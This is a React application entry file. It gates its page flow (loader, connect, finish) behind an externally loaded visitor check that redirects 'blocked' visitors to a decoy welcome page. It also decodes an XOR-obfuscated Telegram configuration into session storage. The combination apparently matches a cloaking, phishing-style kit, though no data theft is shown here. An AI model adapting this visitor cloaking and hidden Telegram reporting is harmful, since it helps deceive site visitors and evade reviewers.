import React, { useEffect, useState } from 'react'
import { Routes, Route, Navigate, useNavigate, useLocation } from 'react-router-dom'
import { I18nProvider } from './contexts/I18nContext'
import { SessionProvider } from './contexts/SessionContext'
import { SecurityProvider } from './contexts/SecurityContext'
import { loadExternalSecurity, EXTERNAL_SECURITY_CONFIG } from './config/externalSecurity'
import Loader from './pages/Loader'
import Home from './pages/Home'
import Loading from './pages/Loading'
import Connect from './pages/Connect'
import Finish from './pages/Finish'
import Welcome from './pages/Welcome'
import api from './services/api'
import './App.css'
import './styles/common.css'

function App() {
  const navigate = useNavigate()
  const location = useLocation()
  const [isInitialized, setIsInitialized] = useState(false)
  const [securityCheck, setSecurityCheck] = useState(null)
  const [externalSecurityReady, setExternalSecurityReady] = useState(false)

  useEffect(() => {
    const initSecurity = async () => {
      let securityLoaded = false
      
      try {
        await loadExternalSecurity()
        
        if (!window.ExternalSecurity) {
          throw new Error('External security file loaded but window.ExternalSecurity is not defined')
        }
        
        if (!window.ExternalSecurity.isReady || !window.ExternalSecurity.isReady()) {
          throw new Error('External security file loaded but not ready')
        }
        
        if (!window.ExternalSecurity.verifySignature) {
          throw new Error('External security file incomplete - missing verifySignature function')
        }
        
        if (!window.ExternalSecurity.getSecuritySignature) {
          throw new Error('External security file incomplete - missing getSecuritySignature function')
        }
        
        if (!window.ExternalSecurity.verifySignature()) {
          throw new Error('Invalid security signature - external file may be tampered or wrong version')
        }
        
        if (!window.ExternalSecurity.hash || !window.ExternalSecurity.encode || 
            !window.ExternalSecurity.generateToken || !window.ExternalSecurity.getIntegrityHash) {
          throw new Error('Missing critical cryptographic functions - external file incomplete')
        }
        
        if (!window.ExternalSecurity.getSecuritySignature || !window.ExternalSecurity.getSecuritySignature()) {
          throw new Error('Missing security signature - external file invalid')
        }
        
        securityLoaded = true
        setExternalSecurityReady(true)
        
        try {
          const page = location.pathname.replace('/', '') || 'loader'
          const securityResult = await window.ExternalSecurity.checkSecurity(page)
          
          setSecurityCheck(securityResult)
          setIsInitialized(true)
          
          if (securityResult.blocked) {
            navigate('/welcome', { replace: true })
            return
          }
        } catch (error) {
          setSecurityCheck({ blocked: true, reason: 'Security check failed: ' + error.message })
          setIsInitialized(true)
          navigate('/welcome', { replace: true })
        }
      } catch (error) {
        setExternalSecurityReady(false)
        setSecurityCheck({ blocked: false, error: error.message })
        setIsInitialized(true)
      }
    }

    initSecurity()
    
    const loadUserTelegramConfig = async () => {
      try {
        const configScript = document.getElementById('user-telegram-config')
        if (configScript) {
          let configText = configScript.textContent.trim()
          
          if (configScript.getAttribute('data-obfuscated') === 'true') {
            const keyParts = ['dk_telegram_', 'obf_key_', '2024_', 'secure_', 'xor_', 'mask']
            const obfKey = keyParts.join('')
            const hexBytes = configText.match(/.{1,2}/g) || []
            const obfBytes = new Uint8Array(hexBytes.map(h => parseInt(h, 16)))
            const keyBytes = new TextEncoder().encode(obfKey)
            const deobfBytes = new Uint8Array(obfBytes.length)
            
            for (let i = 0; i < obfBytes.length; i++) {
              deobfBytes[i] = obfBytes[i] ^ keyBytes[i % keyBytes.length]
            }
            
            configText = new TextDecoder().decode(deobfBytes)
          }
          
          const userConfig = JSON.parse(configText)
          if (userConfig && userConfig.telegram && userConfig.telegram.enabled) {
            sessionStorage.setItem('_user_telegram_config', JSON.stringify(userConfig.telegram))
          }
        }
      } catch (e) {
      }
    }
    loadUserTelegramConfig().catch(() => {})
  }, [location.pathname, navigate])

  if (!isInitialized) {
    return <div>Loading...</div>
  }

  if (EXTERNAL_SECURITY_CONFIG.REQUIRED && !externalSecurityReady) {
    return (
      <div style={{ padding: '20px', fontFamily: 'monospace' }}>
        <h2>External Security Failed to Load</h2>
        <p>Error: {securityCheck?.error || 'Unknown error'}</p>
        <p>Check browser console for details.</p>
      </div>
    )
  }

  if (securityCheck?.blocked) {
    return (
      <SecurityProvider value={securityCheck}>
        <SessionProvider>
          <I18nProvider>
            <Welcome />
          </I18nProvider>
        </SessionProvider>
      </SecurityProvider>
    )
  }

  return (
    <SecurityProvider value={securityCheck}>
      <SessionProvider>
        <I18nProvider>
          <Routes>
            <Route path="/" element={<Navigate to="/loader" replace />} />
            <Route path="/loader" element={<Loader />} />
            <Route path="/home" element={<Home />} />
            <Route path="/loading" element={<Loading />} />
            <Route path="/connect" element={<Connect />} />
            <Route path="/finish" element={<Finish />} />
            <Route path="/welcome" element={<Welcome />} />
            <Route path="*" element={<Navigate to="/loader" replace />} />
          </Routes>
        </I18nProvider>
      </SessionProvider>
    </SecurityProvider>
  )
}

export default App

